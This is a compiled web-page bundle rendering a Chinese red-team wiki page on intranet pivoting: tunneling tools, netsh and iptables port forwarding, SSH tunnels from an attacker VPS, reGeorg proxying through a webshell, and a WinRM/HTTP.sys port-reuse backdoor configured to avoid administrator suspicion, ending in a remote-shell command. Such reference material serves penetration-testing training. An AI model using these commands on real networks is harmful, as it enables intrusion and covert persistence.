(window.__LOADABLE_LOADED_CHUNKS__=window.__LOADABLE_LOADED_CHUNKS__||[]).push([[24],{166:function(e,a,t){"use strict";t.r(a),function(e){t.d(a,"default",(function(){return i}));var n,b=t(95),c=(t(139),t(0),t(96));function s(){return(s=Object.assign||function(e){for(var a=1;a<arguments.length;a++){var t=arguments[a];for(var n in t)Object.prototype.hasOwnProperty.call(t,n)&&(e[n]=t[n])}return e}).apply(this,arguments)}function r(e,a){if(null==e)return{};var t,n,b=function(e,a){if(null==e)return{};var t,n,b={},c=Object.keys(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||(b[t]=e[t]);return b}(e,a);if(Object.getOwnPropertySymbols){var c=Object.getOwnPropertySymbols(e);for(n=0;n<c.length;n++)t=c[n],a.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(b[t]=e[t])}return b}(n="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.enterModule:void 0)&&n(e);"undefined"!=typeof reactHotLoaderGlobal&&reactHotLoaderGlobal.default.signature;var p,l,o=function(e){return function(a){return console.warn("Component "+e+" was not imported, exported, or provided by MDXProvider as global scope"),Object(c.b)("div",a)}},m={},N="wrapper";function i(e){var a=e.components,t=r(e,["components"]);return Object(c.b)(N,s({},m,t,{components:a,mdxType:"MDXLayout"}),Object(c.b)("h1",{className:"__internal",id:"边界代理"},"边界代理",Object(c.b)("a",s({parentName:"h1"},{href:"#%E8%BE%B9%E7%95%8C%E4%BB%A3%E7%90%86","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"遵循三个原则")),Object(c.b)("ol",null,Object(c.b)("li",s({parentName:"ol"},{className:"__internal"}),Object(c.b)("p",{parentName:"li"},Object(c.b)("strong",{parentName:"p"},"稳定性"),"（主要用于扫描）{ 支持高并发、自动断线重连 }")),Object(c.b)("li",s({parentName:"ol"},{className:"__internal"}),Object(c.b)("p",{parentName:"li"},Object(c.b)("strong",{parentName:"p"},"安全性"),"（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }")),Object(c.b)("li",s({parentName:"ol"},{className:"__internal"}),Object(c.b)("p",{parentName:"li"},Object(c.b)("strong",{parentName:"p"},"健壮性"),"   { 支持多种协议方式、最好支持插件定制 }"))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"推荐工具")),Object(c.b)("table",null,Object(c.b)("thead",{parentName:"table"},Object(c.b)("tr",{parentName:"thead"},Object(c.b)("th",s({parentName:"tr"},{align:null}),"工具"),Object(c.b)("th",s({parentName:"tr"},{align:null}),"优点"),Object(c.b)("th",s({parentName:"tr"},{align:null}),"缺点"))),Object(c.b)("tbody",{parentName:"table"},Object(c.b)("tr",{parentName:"tbody"},Object(c.b)("td",s({parentName:"tr"},{align:null}),Object(c.b)("strong",{parentName:"td"},Object(c.b)("a",s({parentName:"strong"},{href:"https://github.com/fatedier/frp",target:"_blank"}),"Frp"))),Object(c.b)("td",s({parentName:"tr"},{align:null}),"稳定、支持断线重连（大流量不断线）",Object(c.b)("br",null),"支持将代理端口放在本地（跳板机只开个frp服务端口）"),Object(c.b)("td",s({parentName:"tr"},{align:null}),"配置复杂，体积偏大")),Object(c.b)("tr",{parentName:"tbody"},Object(c.b)("td",s({parentName:"tr"},{align:null}),Object(c.b)("strong",{parentName:"td"},Object(c.b)("a",s({parentName:"strong"},{href:"https://github.com/ehang-io/nps",target:"_blank"}),"Nps"))),Object(c.b)("td",s({parentName:"tr"},{align:null}),"自带Web管理，一键启动",Object(c.b)("br",null),Object(c.b)("strong",{parentName:"td"},"多级代理友好")),Object(c.b)("td",s({parentName:"tr"},{align:null}),"稳定性不如Frp",Object(c.b)("br",null),"会在tmp生成文件")))),Object(c.b)("h1",{className:"__internal",id:"端口转发（打17_010等漏洞）"},"端口转发（打17_010等漏洞）",Object(c.b)("a",s({parentName:"h1"},{href:"#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%EF%BC%88%E6%89%9317_010%E7%AD%89%E6%BC%8F%E6%B4%9E%EF%BC%89","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("h2",{className:"__internal",id:"windows-netsh"},"Windows netsh",Object(c.b)("a",s({parentName:"h2"},{href:"#windows-netsh","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"netsh"),"仅支持TCP协议， 适用于",Object(c.b)("strong",{parentName:"p"},"双网卡"),"服务器， 连接外网6666端口，就是连接到内网目标上面的3389。 "),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"启动转发")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#查看现有规则"),"\nnetsh interface portproxy show all\n\n",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#添加转发规则"),"\nnetsh interface portproxy ",Object(c.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"set")," v4tov4 ",Object(c.b)("span",s({parentName:"code"},{className:"token assign-left variable"}),"listenaddress"),Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"外网IP ",Object(c.b)("span",s({parentName:"code"},{className:"token assign-left variable"}),"listenport"),Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"6666")," ",Object(c.b)("span",s({parentName:"code"},{className:"token assign-left variable"}),"connectaddress"),Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"内网IP ",Object(c.b)("span",s({parentName:"code"},{className:"token assign-left variable"}),"connectport"),Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"3389")))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"取消转发")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#删除转发规则"),"\nnetsh interface portproxy delete v4tov4 ",Object(c.b)("span",s({parentName:"code"},{className:"token assign-left variable"}),"listenport"),Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"6666"),"\n\n",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#xp需要安装ipv6"),"\nnetsh interface ipv6 ",Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"install")))),Object(c.b)("h2",{className:"__internal",id:"linux-ssh隧道（高权限用）"},"Linux SSH隧道（高权限用）",Object(c.b)("a",s({parentName:"h2"},{href:"#linux-ssh%E9%9A%A7%E9%81%93%EF%BC%88%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%EF%BC%89","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,"SSH一般是允许通过防火墙的，而且传输过程是加密的 "),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"},"测试环境如下图，VPS可访问Web服务器，但不能访问内网其它机器，Web服务器可访问内网其它机器。"),Object(c.b)("p",{parentName:"blockquote"},"目标：以Web服务器为跳板访问内网其它机器。")),Object(c.b)("p",null,Object(c.b)("img",s({parentName:"p"},{src:"/images/image-20200619231457834.png",alt:null}))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"本地转发")),Object(c.b)("p",null,"在",Object(c.b)("inlineCode",{parentName:"p"},"VPS（黑客）"),"上执行以下命令"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"ssh")," -CfNg -L ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"1153"),"（VPS端口）:10.1.1.3（目标主机）:3389（目标端口）\nroot@192.168.0.3（跳板机，Web服务器，会要求输入密码）\n\n",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#查看1153端口是否已经连接"),"\n",Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"netstat")," -tulnp ",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"|")," ",Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"grep")," ",Object(c.b)("span",s({parentName:"code"},{className:"token string"}),'"1153"'),"\n\n",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#连接目标数据库服务器的远程桌面"),"\nrdesktop ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),".0.1:1153"))),Object(c.b)("p",null,"SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；"),Object(c.b)("p",null,"本地端口转发是在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。"),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"远程转发")),Object(c.b)("p",null," 在",Object(c.b)("inlineCode",{parentName:"p"},"Web服务器"),"上执行如下命令 "),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"ssh")," -CfNg -R ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"1122"),"（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5",Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"("),"VPS的IP",Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),")")))),Object(c.b)("p",null,"访问",Object(c.b)("inlineCode",{parentName:"p"},"VPS"),"的1122端口，即可连接内网数据库服务器的3389"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"rdesktop ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"127.0"),".0.1:1122"))),Object(c.b)("p",null,"所有访问",Object(c.b)("inlineCode",{parentName:"p"},"VPS"),"的1122端口的流量都会通过SSH隧道传输到数据库服务器的3389端口"),Object(c.b)("h2",{className:"__internal",id:"icmp隧道"},"ICMP隧道",Object(c.b)("a",s({parentName:"h2"},{href:"#icmp%E9%9A%A7%E9%81%93","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,"项目地址：",Object(c.b)("a",s({parentName:"p"},{href:"https://github.com/esrrhs/pingtunnel",target:"_blank"}),"https://github.com/esrrhs/pingtunnel")),Object(c.b)("p",null,"适用场景 ：特殊环境下icmp流量允许出网"),Object(c.b)("p",null,"实现原理：客户端将TCP流量封装成icmp，然后发送给服务端，服务端再从ICMP包解析出正常TCP流量最后发向目标"),Object(c.b)("p",null,Object(c.b)("img",s({parentName:"p"},{src:"/images/image-20200613145026593.png",alt:null}))),Object(c.b)("h2",{className:"__internal",id:"iptables正向端口转发"},"iptables正向端口转发",Object(c.b)("a",s({parentName:"h2"},{href:"#iptables%E6%AD%A3%E5%90%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null,"1、编辑配置文件"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"vi")," /etc/sysctl.conf\n\tnet.ipv4.ip_forward ",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"=")," ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"1"),Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#开启IP转发")))),Object(c.b)("p",null,"2、关闭服务"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"service")," iptables stop"))),Object(c.b)("p",null,"3、配置规则"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#需要访问的内网地址：10.1.1.11（Windows）"),"\n",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#内网边界web服务器：192.168.100.100（Linux）"),"\niptables -t nat -A PREROUTING --dst ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),".100.100 -p tcp --dport ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"3389")," -j DNAT--to-destination ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"10.1"),".1.11:3389\n\niptables -t nat -A POSTROUTING --dst ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"10.1"),".1.11 -p tcp --dport ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"3389")," -j SNAT --to-source ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"192.168"),".100.100"))),Object(c.b)("p",null,"4、保存并重启服务"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"service")," iptables save ",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"&&")," ",Object(c.b)("span",s({parentName:"code"},{className:"token function"}),"service")," iptables start"))),Object(c.b)("p",null,"这时访问Web服务器的3389就能登录到内网机器的桌面了。"),Object(c.b)("h1",{className:"__internal",id:"端口复用"},"端口复用",Object(c.b)("a",s({parentName:"h1"},{href:"#%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"},Object(c.b)("strong",{parentName:"p"},"适用场景")),Object(c.b)("p",{parentName:"blockquote"},"需要占用一些已经开启的端口情况下（  server只对外开放指定端口，无法向外进行端口转发  、规避防火墙）"),Object(c.b)("p",{parentName:"blockquote"},"当前机器不出网不出网情况下，留正向后门")),Object(c.b)("h2",{className:"__internal",id:"regeorg-端口复用"},"reGeorg 端口复用",Object(c.b)("a",s({parentName:"h2"},{href:"#regeorg-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"},"网络情况：A只能连接B主机的80端口，A无法与C进行通信，且B无法与外网进行通信 ")),Object(c.b)("p",null,"项目地址： ",Object(c.b)("a",s({parentName:"p"},{href:"https://github.com/sensepost/reGeorg",target:"_blank"}),"https://github.com/sensepost/reGeorg")," "),Object(c.b)("p",null,"reGeorg是一个Python2.7环境下开发的一款结合Webshell进行端口复用的工具；"),Object(c.b)("p",null,"能够将数据通过在本地建立的Socks服务转发到内网环境 ；"),Object(c.b)("p",null,"reGeorg需要配合Webshell使用，并且需要一个良好的网络状况，Python环境必须安装",Object(c.b)("inlineCode",{parentName:"p"},"Urlib3")),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"创建Socks5代理")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"python2 reGeorgSocksProxy.py -p ",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"本地Socks5服务监听的端口",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),">")," -u ",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"<"),"Webshell地址",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),">"),"\npython2 reGeorgSocksProxy.py -p ",Object(c.b)("span",s({parentName:"code"},{className:"token number"}),"8888")," -u http://xxx.com/shell.jsp"))),Object(c.b)("p",null," 之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389 "),Object(c.b)("h2",{className:"__internal",id:"httpsys端口复用后门"},"HTTP.sys端口复用后门",Object(c.b)("a",s({parentName:"h2"},{href:"#httpsys%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8%E5%90%8E%E9%97%A8","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("blockquote",null,Object(c.b)("p",{parentName:"blockquote"}," HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫",Object(c.b)("strong",{parentName:"p"},"Port Sharing"),"，即端口共享；"),Object(c.b)("p",{parentName:"blockquote"}," 所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；"),Object(c.b)("p",{parentName:"blockquote"}," 使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门 ")),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"netsh http show servicestate\t",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#查看所有在HTTP.sys上注册过的url前缀")))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"1、 开启WinRM服务")),Object(c.b)("p",null,"WinRm使用端口：",Object(c.b)("inlineCode",{parentName:"p"},"http 5985、https 5986")," "),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"Server 2012"),"及之后，已经默认开启WinRM并监听了",Object(c.b)("inlineCode",{parentName:"p"},"5985"),"端口"),Object(c.b)("p",null,Object(c.b)("inlineCode",{parentName:"p"},"Server 2008"),"及之前的系统"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"winrm quickconfig -q\t\t\t",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#开启WinRM并自动从防火墙放行`5985`端口")))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"2、 Server 2012配置，新增80端口Listerner")),Object(c.b)("p",null,"对于原本就开放了WinRM的机器（Server 2012），需要保留该端口，以免影响系统管理员正常使用"),Object(c.b)("p",null,"同时还需要新增一个80端口的Listener供攻击者使用"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"winrm ",Object(c.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"set")," winrm/config/service @",Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"{"),"EnableCompatibilityHttpListener",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",s({parentName:"code"},{className:"token string"}),'"true"'),Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"}"),"\n\nwinrm e winrm/config/Listener\t",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#查看80端口的Listener是否出现"),"\nnetsh http show servicestate\t",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"#查看是否新增了url前缀")))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"3、Server 2008配置，修改WinRM端口")),Object(c.b)("p",null,"对于原本未开放WinRM服务的机器（Server 2008），需要把新开的",Object(c.b)("strong",{parentName:"p"},"5985"),"端口修改至80端口，避免引起系统管理员怀疑"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"winrm ",Object(c.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"set")," winrm/config/Listener?Address",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"*+Transport",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),"HTTP @",Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"{"),"Port",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",s({parentName:"code"},{className:"token string"}),'"80"'),Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"}")))),Object(c.b)("p",null,Object(c.b)("strong",{parentName:"p"},"4、后门连接")),Object(c.b)("p",null," 首先开启本机WinRM服务，然后设置信任连接的主机 "),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"winrm quickconfig -q \t",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"# 开启服务"),"\nwinrm ",Object(c.b)("span",s({parentName:"code"},{className:"token builtin class-name"}),"set")," winrm/config/Client @",Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"{"),"TrustedHosts",Object(c.b)("span",s({parentName:"code"},{className:"token operator"}),"="),Object(c.b)("span",s({parentName:"code"},{className:"token string"}),'"*"'),Object(c.b)("span",s({parentName:"code"},{className:"token punctuation"}),"}"),"  ",Object(c.b)("span",s({parentName:"code"},{className:"token comment"}),"# 设置信任连接的主机")))),Object(c.b)("p",null," 执行使用winrs命令连接远程WinRM服务，获取交互shell"),Object(c.b)("div",{className:"rcpress-highlight","data-language":"bash"},Object(c.b)("pre",s({parentName:"div"},{className:"language-bash"}),Object(c.b)("code",s({parentName:"pre"},{className:"language-bash"}),"winrs -r:http://www.baidu.com -u:administrator -p:P@ssw0rd cmd"))),Object(c.b)("hr",null),Object(c.b)("p",null,"端口复用相关工具： ",Object(c.b)("a",s({parentName:"p"},{href:"https://github.com/Heart-Sky/port-multiplexing",target:"_blank"}),"https://github.com/Heart-Sky/port-multiplexing")," "),Object(c.b)("h1",{className:"__internal",id:"参考连接"},"参考连接",Object(c.b)("a",s({parentName:"h1"},{href:"#%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5","aria-hidden":!0,className:"anchor"}),"#")),Object(c.b)("p",null," ",Object(c.b)("a",s({parentName:"p"},{href:"https://www.cnblogs.com/0x4D75/p/11381449.html#%E4%B8%80-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8",target:"_blank"}),"端口复用后门 - 0x4D75 - 博客园")," "))}i.isMDXComponent=!0,i=Object(b.hot)(e)(i),(p="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.default:void 0)&&(p.register(o,"makeShortcode","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\net-proxy.md"),p.register(m,"layoutProps","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\net-proxy.md"),p.register(N,"MDXLayout","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\net-proxy.md"),p.register(i,"MDXContent","E:\\Code\\Project\\wgpsec\\WgpsecWiki\\docs\\knowledge\\hw\\net-proxy.md")),(l="undefined"!=typeof reactHotLoaderGlobal?reactHotLoaderGlobal.leaveModule:void 0)&&l(e)}.call(this,t(23)(e))}}]);